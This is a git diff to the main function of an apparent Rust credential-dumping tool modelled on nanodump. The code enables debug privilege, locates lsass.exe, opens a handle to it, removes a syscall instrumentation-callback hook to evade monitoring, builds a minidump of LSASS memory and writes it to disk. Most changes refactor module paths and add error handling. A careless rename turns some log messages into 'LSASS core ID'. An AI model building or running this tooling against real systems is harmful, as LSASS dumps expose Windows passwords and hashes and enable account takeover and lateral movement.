@@ -2,23 +2,22 @@ extern crate alloc;
 
 mod utils;
 mod core;
-mod nt;
-mod winapi;
 mod cli;
 mod syscall;
 
 use crate::cli::parser::parse_args;
-use crate::core::dump::open_handle_to_lsass;
+use crate::core::handle::obtain::open_handle_to_lsass;
 use crate::core::permission::get_lsass_min_permissions;
 use crate::core::privilege::{enable_debug_privilege, is_debug_privilege_enabled};
 use crate::core::process::get_pid_by_name_nt;
-use crate::nt::dump::nanodump::nano_dump_write_dump;
-use crate::utils::process_instrumentation_callback::remove_syscall_callback_hook;
+use crate::core::dump::nanodump::nano_dump_write_dump;
+use crate::core::process_instrumentation_callback::remove_syscall_callback_hook;
 use crate::utils::utils::{get_full_path, write_buffer};
 use log::{debug, error, info};
-use nt::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
+use core::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
 use std::process::exit;
 use crate::cli::header::build_header;
+use crate::core::dump::model::DumpError;
 
 fn main() {
     let args = parse_args();
@@ -35,11 +34,8 @@ fn main() {
     };
 
     env_logger::Builder::from_default_env().filter_level(log_level).init();
-    
-    info!("{}",build_header());
 
-    //it_works();
-    //exit(0);
+    info!("{}",build_header());
 
     debug!("========== PARAMETERS ==========");
 
@@ -83,6 +79,7 @@ fn main() {
 
     debug!("========== ENABLING DEBUG PRIVILEGES ==========");
     info!("Trying to enable debug privileges...");
+    
     enable_debug_privilege();
     if is_debug_privilege_enabled() {
         info!("  -> Debug privilege successfully enabled");
@@ -91,9 +88,6 @@ fn main() {
         exit(1)
     }
     debug!("======== END DEBUG PRIVILEGES ========\n");
-
-    //let local_pid = std::process::id();
-    //debug!("PID local: {}", local_pid);
 
     debug!("========== LSASS PID ==========");
     info!("Trying to obtain lsass pid...");
@@ -104,7 +98,7 @@ fn main() {
         info!("  -> Searching pid by name lsass.exe");
         lsass_pid = get_pid_by_name_nt("lsass.exe");
         if lsass_pid.is_none() {
-            error!("Error: Unable to find process");
+            error!("Error: Unable to find core");
             exit(1);
         }
     }
@@ -113,9 +107,9 @@ fn main() {
         lsass_pid = Some(args.lsass_pid as usize);
     }
     let lsass_pid = lsass_pid.unwrap() as u32;
-    info!("    -> LSASS process ID: {}", lsass_pid);
+    info!("    -> LSASS core ID: {}", lsass_pid);
     if args.get_pid_and_leave{
-        debug!("Ending process due to get_pid_and_leave...");
+        debug!("Ending core due to get_pid_and_leave...");
         return;
     }
     debug!("======== END LSASS PID ==========\n");
@@ -138,7 +132,6 @@ fn main() {
 
     debug!("========== DUMPING MEMORY ==========");
     info!("Trying to dump memory...");
-    //let _ = dump_process(h_process.unwrap(), lsass_pid,"lsass_dump.dmp");
 
     let mut dc : DumpContext = DumpContext {
         h_process,
@@ -151,13 +144,23 @@ fn main() {
         buf : Vec::new(),
     };
 
-    if nano_dump_write_dump(&mut dc).is_ok(){
-        if args.write_dump_to_disk {
-            info!("  -> Writing dump at {}", args.path);
-            let _ = write_buffer(&*args.path, &dc.buf);
+
+    match nano_dump_write_dump(&mut dc) {
+        Ok(_) => {
+            if args.write_dump_to_disk {
+                info!("  -> Writing dump at {}", args.path);
+                if let Err(e) = write_buffer(&*args.path, &dc.buf) {
+                    error!("Failed to write buffer to disk: {}", e);
+                }
+            }
+            info!("Memory dumped successfully");
         }
+        Err(e) => match e {
+            DumpError::Io(io_err) => error!("I/O error during dump: {}", io_err),
+            DumpError::InvalidState => error!("Cannot dump memory: invalid state"),
+            DumpError::WriteFailed => error!("Memory dump failed while writing"),
+        },
     }
-    info!("Memory dumped successfully");
     debug!("======== END DUMPING MEMORY ========\n")
 
 }
